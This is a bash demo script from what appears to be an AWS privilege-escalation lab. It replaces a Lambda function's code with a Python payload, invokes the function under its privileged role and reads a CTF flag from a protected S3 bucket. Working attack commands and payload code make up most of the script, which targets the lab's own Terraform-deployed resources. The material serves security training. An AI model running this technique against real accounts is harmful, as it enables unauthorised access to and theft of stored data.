#!/bin/bash

# Demo script for lambda:UpdateFunctionCode + lambda:InvokeFunction to S3 bucket access
# This scenario demonstrates how a user with BOTH lambda:UpdateFunctionCode AND
# lambda:InvokeFunction can modify existing Lambda function code and separately invoke
# it to execute malicious logic under the function's privileged role and read sensitive
# data from a target S3 bucket.
#
# Key distinction from lambda-003: both UpdateFunctionCode AND InvokeFunction are
# separately required — neither permission alone is sufficient for the attack.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-004-to-bucket-starting-user"
TARGET_LAMBDA="pl-prod-lambda-004-to-bucket-target-lambda"
TARGET_ROLE="pl-prod-lambda-004-to-bucket-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode + InvokeFunction to S3 Bucket Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_004_lambda_updatefunctioncode_lambda_invokefunction.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract target bucket name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target bucket: $TARGET_BUCKET"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have S3 access yet
echo -e "${YELLOW}Step 4: Verifying we don't have access to the target bucket yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
echo "Attempting to list target bucket contents (should fail)..."
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
if aws s3 ls "s3://$TARGET_BUCKET/" --region "$AWS_REGION" &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have S3 access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket $TARGET_BUCKET (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover target Lambda function details
echo -e "${YELLOW}Step 5: Discovering target Lambda function${NC}"
echo "Target Lambda function: $TARGET_LAMBDA"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
FUNCTION_INFO=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get Lambda function details${NC}"
    exit 1
fi

# Extract function metadata
HANDLER_NAME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Handler')
FUNCTION_ROLE=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Role')
RUNTIME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Runtime')

echo "Handler: $HANDLER_NAME"
echo "Runtime: $RUNTIME"
echo "Execution Role: $FUNCTION_ROLE"
echo -e "${GREEN}✓ Retrieved function details${NC}"
echo ""
echo -e "${BLUE}Key observation:${NC}"
echo "This Lambda function runs with a privileged role that has s3:GetObject on the target bucket."
echo "We have two separate permissions required for the attack:"
echo "  1. lambda:UpdateFunctionCode — to replace the function's code with our malicious payload"
echo "  2. lambda:InvokeFunction     — to manually trigger execution of the modified function"
echo "Neither permission alone completes the attack; both are required."
echo ""

# Step 6: Backup original Lambda function code
echo -e "${YELLOW}Step 6: Backing up original Lambda function code${NC}"
echo "Downloading original code for restoration after demo..."

CODE_LOCATION=$(echo "$FUNCTION_INFO" | jq -r '.Code.Location')

curl -s "$CODE_LOCATION" -o /tmp/lambda-004-to-bucket-original-backup.zip

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Original code backed up to /tmp/lambda-004-to-bucket-original-backup.zip${NC}"
else
    echo -e "${RED}Error: Could not backup original code${NC}"
    exit 1
fi
echo ""

# Step 7: Create malicious Lambda function code
echo -e "${YELLOW}Step 7: Creating malicious Lambda function code${NC}"
echo "Creating Python code that will read flag.txt from the target S3 bucket and return it..."

# CRITICAL: Filename must match handler name (lambda_function.lambda_handler)
cat > /tmp/lambda_function.py << EOF
import json
import boto3

def lambda_handler(event, context):
    """
    Malicious Lambda function that reads flag.txt from the target S3 bucket.
    This function runs with the privileged role attached to the Lambda function,
    which has s3:GetObject on the sensitive bucket.
    The bucket name is embedded at deploy-time so no extra Lambda permissions
    (e.g. lambda:UpdateFunctionConfiguration) are needed.
    """
    s3 = boto3.client('s3')
    bucket = '${TARGET_BUCKET}'

    try:
        obj = s3.get_object(Bucket=bucket, Key='flag.txt')
        flag = obj['Body'].read().decode('utf-8').strip()
        return {
            'statusCode': 200,
            'body': json.dumps({'flag': flag})
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
EOF

echo -e "${GREEN}✓ Malicious code created${NC}\n"

# Step 8: Package the malicious code
echo -e "${YELLOW}Step 8: Packaging malicious code into deployment package${NC}"
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

if [ -f /tmp/lambda_function.zip ]; then
    echo -e "${GREEN}✓ Malicious code packaged${NC}"
else
    echo -e "${RED}Error: Failed to create zip file${NC}"
    rm -f /tmp/lambda_function.py
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Update Lambda function code (FIRST REQUIRED PERMISSION)
echo -e "${YELLOW}Step 9: Updating Lambda function code with malicious payload${NC}"
echo -e "${BLUE}Attack Vector 1: lambda:UpdateFunctionCode${NC}"
echo "This permission allows replacing the function code — but alone it cannot trigger execution."
echo "Function: $TARGET_LAMBDA"
echo ""
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json"
UPDATE_RESULT=$(aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    LAST_UPDATE_STATUS=$(echo "$UPDATE_RESULT" | jq -r '.LastUpdateStatus')
    echo "Update Status: $LAST_UPDATE_STATUS"
    echo -e "${GREEN}✓ Successfully updated Lambda function code!${NC}"
else
    echo -e "${RED}Error: Failed to update Lambda function code${NC}"
    echo "$UPDATE_RESULT"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-004-to-bucket-original-backup.zip
    exit 1
fi
echo ""

# Wait for Lambda code update to reach Successful state before invoking.
# Using readonly creds because lambda:GetFunction is in the "helpful" permission set
# which may be restricted during a validation run — readonly user always has read access.
echo -e "${YELLOW}Waiting for Lambda code update to reach Successful state...${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
MAX_WAIT=60
WAITED=0
while [ "$WAITED" -lt "$MAX_WAIT" ]; do
    UPDATE_STATUS=$(aws lambda get-function \
        --region "$AWS_REGION" \
        --function-name "$TARGET_LAMBDA" \
        --query 'Configuration.LastUpdateStatus' \
        --output text 2>/dev/null)
    if [ "$UPDATE_STATUS" = "Successful" ]; then
        echo -e "${GREEN}✓ Lambda code update complete (LastUpdateStatus: Successful)${NC}\n"
        break
    fi
    echo "  LastUpdateStatus: $UPDATE_STATUS — waiting 5s..."
    sleep 5
    WAITED=$((WAITED + 5))
done
if [ "$WAITED" -ge "$MAX_WAIT" ]; then
    echo -e "${YELLOW}Warning: Lambda update did not reach Successful within ${MAX_WAIT}s, proceeding${NC}"
fi

# [EXPLOIT] Step 10: Invoke the modified Lambda function (SECOND REQUIRED PERMISSION)
echo -e "${YELLOW}Step 10: Invoking Lambda function to read flag from target S3 bucket${NC}"
echo -e "${BLUE}Attack Vector 2: lambda:InvokeFunction${NC}"
echo "This is the second distinct permission required — UpdateFunctionCode alone cannot trigger execution."
echo "By invoking the function, our malicious code executes under the Lambda's privileged role."
echo "Function: $TARGET_LAMBDA"
echo ""
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/lambda-004-to-bucket-response.json --output json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
    /tmp/lambda-004-to-bucket-response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Raw response from Lambda function:"
    cat /tmp/lambda-004-to-bucket-response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-004-to-bucket-response.json /tmp/lambda-004-to-bucket-original-backup.zip
    exit 1
fi

# [EXPLOIT] Step 11: Parse Lambda response and capture the CTF flag
echo -e "${YELLOW}Step 11: Capturing CTF flag from Lambda response${NC}"

# Parse the nested JSON response body
RESPONSE_BODY=$(cat /tmp/lambda-004-to-bucket-response.json | jq -r '.body' 2>/dev/null)

if [ -z "$RESPONSE_BODY" ] || [ "$RESPONSE_BODY" = "null" ]; then
    echo -e "${RED}Error: Could not extract response body from Lambda${NC}"
    echo "Raw response:"
    cat /tmp/lambda-004-to-bucket-response.json
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-004-to-bucket-response.json /tmp/lambda-004-to-bucket-original-backup.zip
    exit 1
fi

FLAG_VALUE=$(echo "$RESPONSE_BODY" | jq -r '.flag' 2>/dev/null)

if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "null" ]; then
    echo -e "${RED}Error: Could not extract flag from Lambda response body${NC}"
    echo "Response body: $RESPONSE_BODY"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-004-to-bucket-response.json /tmp/lambda-004-to-bucket-original-backup.zip
    exit 1
fi

show_attack_cmd "Attacker (Lambda with target role)" "# Lambda read s3://$TARGET_BUCKET/flag.txt and returned flag in response body"
echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
echo ""

# Clean up temporary files (keep backup for cleanup script)
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-004-to-bucket-response.json

# Restore helpful permissions before final summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
echo "2. Discovered existing Lambda function: $TARGET_LAMBDA with privileged role"
echo "3. Lambda function execution role: $TARGET_ROLE (has s3:GetObject on the target bucket)"
echo "4. Updated Lambda function code with malicious payload using lambda:UpdateFunctionCode"
echo "   (bucket name embedded directly in the payload — no lambda:UpdateFunctionConfiguration needed)"
echo "5. Manually invoked Lambda function using lambda:InvokeFunction to execute payload"
echo "6. Malicious code ran with the Lambda's role and read flag.txt from the target bucket"
echo "7. Captured CTF flag from Lambda response: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (lambda:UpdateFunctionCode) → Replace $TARGET_LAMBDA code with malicious payload"
echo -e "  → (lambda:InvokeFunction) → Execute modified function as $TARGET_ROLE"
echo -e "  → (s3:GetObject flag.txt) → CTF Flag"

echo -e "\n${YELLOW}Why Both Permissions Are Required:${NC}"
echo "- lambda:UpdateFunctionCode alone: can modify code but cannot trigger execution"
echo "- lambda:InvokeFunction alone: can invoke the function but cannot change what it does"
echo "- Together: attacker controls both the code that runs AND when it runs"
echo "- The Lambda executes with its assigned IAM role's permissions regardless of who invokes it"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function: $TARGET_LAMBDA (code and environment variables changed)"
echo "- Backup of original code: /tmp/lambda-004-to-bucket-original-backup.zip"

echo -e "\n${RED}Warning: The Lambda function code and environment variables have been modified${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  run plabs cleanup or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
